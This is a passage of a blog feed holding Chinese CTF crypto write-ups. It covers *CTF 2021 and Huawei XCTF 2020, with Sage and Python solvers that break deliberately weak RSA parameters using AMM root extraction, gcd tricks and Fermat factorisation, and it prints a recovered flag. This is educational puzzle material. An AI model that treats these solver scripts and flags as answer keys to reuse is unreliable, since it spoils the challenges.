class="number">20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607</span></span><br><span class="line">d1 = <span class="number">36167461773898995192586226632578677184913220227461899855497899052924496298787</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">17653913822265292046140436077352027388518012934178497059850703004839268622175666123728756590505344279395546682262531546841391088108347695091027910544112830270722179480786859703225421972669021406495452107007154426730798752912163553332446929049057464612267870012438268458914652129391150217932076946886301294155031704279222594842585123671871118879574946424138391703308869753154497665630799300138651304835205755177940116680821142858923842124294529640719629497853598914963074656319325664210104788201957945801990296604585721820046391439235286951088086966253038989586737352467905401107613763487302070546247282406664431777475</span></span><br><span class="line">p = <span class="built_in">pow</span>(c1,d1,n1) + <span class="number">1</span></span><br><span class="line">n = <span class="number">22346087036331379968192118389403047568445805414881948978518580277027027486284293415097623011228506968071753709256352246733181304513713003096615266613365080909760605498017330085960699607777361429562376124376340215426398797920168016137830563564636922257215066266075494625782943973857490781916694118187094786034792437781964601089843549995939887939410763350338658901108020658475956489391300528691289604149598720803012371765770928211044755626045817053870803040863722458554924076011151695567147976903053993914859714631837755435592006986598006207692599019026644753575853382810261910332197447386727419606073948645238377595719</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">cipher = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p><code>real_tirck</code>中给出了<code>e</code>的下界，以及告诉<code>e</code>和<code>phi</code>并不互素，所以我们猜测 $e\mid\varphi(n)$ （这里其实应该有证明的，有时间了再回来证），所以我们从下界爆破<code>e</code>，并使用AMM测试，能够跑出<code>flag</code>的即为正确的<code>e</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">mq = AMM(cq, e, q)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">q_proot = findAllPRoot(q, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line"><span class="built_in">print</span>(mps, mqs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    h = m.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span>.fromhex(h).startswith(<span class="string">b&#x27;*CTF&#x27;</span>) <span class="keyword">or</span> <span class="built_in">bytes</span>.fromhex(h).startswith(<span class="string">b&#x27;*ctf&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(h))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq = []</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(mpp), <span class="built_in">int</span>(mqq)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> check(solution):</span><br><span class="line">            <span class="built_in">print</span>(solution)</span><br><span class="line">            qwq.append(solution)</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(qwq)</span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; s.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line"><span class="comment"># 1061.3823564052582 s.</span></span><br><span class="line"><span class="comment"># b&#x27;*CTF&#123;S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This&#125;Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww&#x27;</span></span><br><span class="line"><span class="comment"># 5715792447162584004830995621288196364667316788985719423575200593843082226610550301623816157835166569193582787431644910982754181340491582409788340367828925355394884518044538804653367543125682677650052644197537897019515168750419392615178911318381369421233129629180441067485047</span></span><br></pre></td></tr></table></figure><h3 id="MyCurve"><a href="#MyCurve" class="headerlink" title="MyCurve"></a>MyCurve</h3><p>先放个神仙的sol和资料，有时间回来复现</p><p>binary edwards curve<br>这个曲线和正常的ecc有一个一一对应的映射<br>映射回去的曲线的阶光滑<br>容易算dlp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">name binary Edwards curves</span><br><span class="line">parameter d1</span><br><span class="line">parameter d2</span><br><span class="line">coordinate x</span><br><span class="line">coordinate y</span><br><span class="line">satisfying d1(x+y)+d2(x^2+y^2) = (x+x^2)(y+y^2)</span><br><span class="line">addition x = (d1(x1+x2)+d2(x1+y1)(x2+y2)+(x1+x1^2)(x2(y1+y2+1)+y1 y2)) / (d1+(x1+x1^2)(x2+y2))</span><br><span class="line">addition y = (d1(y1+y2)+d2(x1+y1)(x2+y2)+(y1+y1^2)(y2(x1+x2+1)+x1 x2)) / (d1+(y1+y1^2)(x2+y2))</span><br><span class="line">doubling x = (d1(x1+x1)+d2(x1+y1)(x1+y1)+(x1+x1^2)(x1(y1+y1+1)+y1 y1)) / (d1+(x1+x1^2)(x1+y1))</span><br><span class="line">doubling y = (d1(y1+y1)+d2(x1+y1)(x1+y1)+(y1+y1^2)(y1(x1+x1+1)+x1 x1)) / (d1+(y1+y1^2)(x1+y1))</span><br><span class="line">negation x = y1</span><br><span class="line">negation y = x1</span><br><span class="line">toweierstrass u = d1(d1^2+d1+d2)(x+y)/(x y+d1(x+y))</span><br><span class="line">toweierstrass v = d1(d1^2+d1+d2)(x/(x y+d1(x+y))+d1+1)</span><br><span class="line">a0 = 1</span><br><span class="line">a1 = 1</span><br><span class="line">a2 = d1^2+d2</span><br><span class="line">a3 = 0</span><br><span class="line">a4 = 0</span><br><span class="line">a6 = d1^4(d1^4+d1^2+d2^2)</span><br><span class="line">fromweierstrass x = d1(u+d1^2+d1+d2)/(u+v+(d1^2+d1)(d1^2+d1+d2))</span><br><span class="line">fromweierstrass y = d1(u+d1^2+d1+d2)/(v+(d1^2+d1)(d1^2+d1+d2))</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>最后摸了好久的鱼，不然就能AK了，呜呜，爬了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WP-for-ctf2021&quot;&gt;&lt;a href=&quot;#WP-for-ctf2021&quot; class=&quot;headerlink&quot; title=&quot;WP for *ctf2021&quot;&gt;&lt;/a&gt;WP for *ctf2021&lt;/h1&gt;&lt;p&gt;第一次和V&amp;amp;N的师傅们打比赛就冲到了第六，好耶！&lt;/p&gt;
&lt;p&gt;最后没AK，不好（悲）&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Wp for 华为XCTF2020鸿蒙计算专场&#39;s crypto</title>
    <link href="http://example.com/2020/12/23/Wp-for-%E5%8D%8E%E4%B8%BAXCTF2020-s-crypto/"/>
    <id>http://example.com/2020/12/23/Wp-for-%E5%8D%8E%E4%B8%BAXCTF2020-s-crypto/</id>
    <published>2020-12-23T09:02:49.000Z</published>
    <updated>2021-03-11T01:21:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto"><a href="#Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto" class="headerlink" title="Wp for 华为XCTF2020鸿蒙计算专场’s crypto"></a>Wp for 华为XCTF2020鸿蒙计算专场’s crypto</h1><span id="more"></span><h2 id="RRSSAA"><a href="#RRSSAA" class="headerlink" title="RRSSAA"></a>RRSSAA</h2><p>题目分三个level，加密了三次，我们反过来解密就好了</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>观察<code>e</code>的生成代码，发现存在 $e&#x3D;4\times (1+k\times (p-1))+3$ 这一关系，即 $e&#x3D;7+k\times(p-1)$ ，所以由费马小定理有 $m^e&#x3D;m^7\ (mod\ p)$ ，所以可知 $p\mid m^e-m^7$ ，那么可以算出 $p&#x3D;gcd(m^e-m^7,n)$</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>因为<code>t = next_prime(o) u = next_prime(s)</code>，所以<code>p1q1、p1q2、p2q1、p2q2</code>都比较相近，联想费马分解，因为 $n&#x3D;x^2-y^2&#x3D;(x+y)\times(x-y)&#x3D;a\times b$ ，所以我们使用费马分解在 $\sqrt{n}$ 附近寻找<code>x</code>并计算<code>y</code>，而此时我们得到的 <code>(x,y)</code> 则是<code>p1q1与p2q2</code>、<code>p1q2与p2p1</code>、<code>p1p2与q1q2</code>中的其中一个，那当我们得到两组合法的<code>(x,y)</code>后，即可通过<code>gcd</code>来得到<code>p1,p2,q1,q2</code>了</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>又是<code>next_prime</code>，观察到  $y$ 与 $21\cdot x$ 相近， $z$ 与 $3\cdot x\cdot y$ 相近，可知 $n &#x3D; x\cdot y\cdot z\approx 1363\cdot x^4$ ，所以我们在 $\sqrt[4]\frac{n}{1363}$ 的周围即可找到 $x$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#level3</span></span><br><span class="line">c4 = <span class="number">2223858574968933504319836040365324804971094330459462393944127171432282147604729897704345429059208580970050059952008010773685842392707183675848552727061753816604521338667996166424030688312622416918364914092916834363424563757848785094598668876885795408211613686469658206698800530604510586036849762682266643367887969834461905627352683770069831534697242348271330554339411094917823350455146582135451453515538908713886757653213973927096082</span>********************************************</span><br><span class="line">m4 = <span class="number">81225738828166640599054154023183465870678960906769673605358084529196871174429427936591822589995476552044227730868809310992934103731850597399114246762836121101348301079296663951503688072299542357013093324718850936925265954204973634470836187733828189312553819810470</span>********************************************</span><br><span class="line">c3 = <span class="number">23850649176609488069574576816416148886692179606070063605432689009210174812454985632639914109186048913143848105334392538145230671686367689762200590281089005923231195246579033646977003291454535177690932650527152046258702322882034275451509830373108765348015483098908530262342484124214979398113857256424921042629540596777935387076042051793448841426568428955677950006478374618351793957423993726834602082713108846572798935325391218935581430299</span>********************************************</span><br><span class="line">n3 = <span class="number">245027309396554072925434368973821962975166642272733206023979068786967233722428777765504465639508676248193528531220331147117321254335887247798699854774950988027443444489150326074699546422578258559318722819082323316238297250430318005357394321339486074483626412040345465814449044087548920371100312025734633992016258120056152646898775372319740238700067921969618291620584466621726342124271864707245999413528305460437729692977332395186047416381</span>********************************************</span><br><span class="line"></span><br><span class="line">p3 = gcd(c4 - <span class="built_in">pow</span>(m4,<span class="number">7</span>,n3),n3)</span><br><span class="line">q3 = n3 // p3</span><br><span class="line"><span class="keyword">assert</span> p3 * q3 == n3</span><br><span class="line">phi3 = (p3-<span class="number">1</span>) * (q3-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = getPrime(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span>(gcd(s,p3-<span class="number">1</span>) == <span class="number">1</span>):</span><br><span class="line">        sinv = invert(s,p3-<span class="number">1</span>)</span><br><span class="line">        e = <span class="number">4</span>*s*sinv+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span>(gcd(phi3,e) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">pow</span>(m4,e,n3)==c4):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">e3 = e</span><br><span class="line">d3 = invert(e3,phi3)</span><br><span class="line">m3 = <span class="built_in">pow</span>(c3,d3,n3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level3 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    get_context().precision = <span class="number">2048</span></span><br><span class="line">    x = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        y2 = x ** <span class="number">2</span> - n</span><br><span class="line">        <span class="keyword">if</span> is_square(y2):</span><br><span class="line">            <span class="comment">#print(&#x27;x = &#x27;,x)</span></span><br><span class="line">            y2 = mpz(y2)</span><br><span class="line">            get_context().precision = <span class="number">2048</span></span><br><span class="line">            y = <span class="built_in">int</span>(sqrt(y2))</span><br><span class="line">            factor_list.append([x+y, x-y])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"><span class="comment">#level2</span></span><br><span class="line">c2 = m3</span><br><span class="line">n2 = <span class="number">87994385997075478104135902527696370476697303732829349373685150934389771812000800579489779988597377758155357032119662485786694473083701713238817766110307526481354801968791624978964643229368334587752275506234350005276147810555241459363533576625362804706641125169760333584993303919294358578117889235906667830900166286169</span>********************************************</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">factor_list = fermat_factorization(n2)</span><br><span class="line">[X1, Y1] = factor_list[<span class="number">0</span>]</span><br><span class="line">[X2, Y2] = factor_list[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> X1 * Y1 == n2</span><br><span class="line"><span class="keyword">assert</span> X2 * Y2 == n2</span><br><span class="line">p21 = gcd(X1, X2)</span><br><span class="line">q21 = X1 // p21</span><br><span class="line">p22 = gcd(Y1, Y2)</span><br><span class="line">q22 = Y1 // p22</span><br><span class="line"><span class="keyword">assert</span> p21 *p22 * q21 * q22 == n2</span><br><span class="line">phi2 = (p21 - <span class="number">1</span>) * (q21 - <span class="number">1</span>) * (p22 - <span class="number">1</span>) * (q22 - <span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2,phi2)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level2 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#level1</span></span><br><span class="line">c1 = m2</span><br><span class="line">n1 = <span class="number">72968331464378596578736213097836639538889759902365332315018563128110329234698340288949958887638828272808811489147149910844881732898599415772529999325992095319128544723262119362648159655825918097703197797125275721741525608198285972415832787315444112461546745146260018587323632627512444194155444076538738583091</span>********************************************</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">base = iroot(n1//<span class="number">21</span>//<span class="number">63</span>,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">10000</span>,<span class="number">10000</span>):</span><br><span class="line">    x = base + i</span><br><span class="line">    <span class="keyword">if</span>(isPrime(x)):</span><br><span class="line">        y = next_prime(<span class="number">21</span>*x)</span><br><span class="line">        z = next_prime(<span class="number">3</span>*x*y)</span><br><span class="line">        <span class="keyword">if</span>(x*y*z==n1):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level1 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">phi1 = (x-<span class="number">1</span>) * (y-<span class="number">1</span>) * (z-<span class="number">1</span>)</span><br><span class="line">d1 = inverse(e1,phi1)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line">flag = long_to_bytes(m1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/23/ghpPnrLlq2FT8RI.png" alt="27.png"> </p><h2 id="combinelfsr"><a href="#combinelfsr" class="headerlink" title="combinelfsr"></a>combinelfsr</h2><p>没看，想起来了就复现，爬了</p><h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>没看，想起来了就复现，爬了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto&quot;&gt;&lt;a href=&quot;#Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for 华为XCTF2020鸿蒙计算专场’s crypto&quot;&gt;&lt;/a&gt;Wp for 华为XCTF2020鸿蒙计算专场’s crypto&lt;/h1&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
</feed>
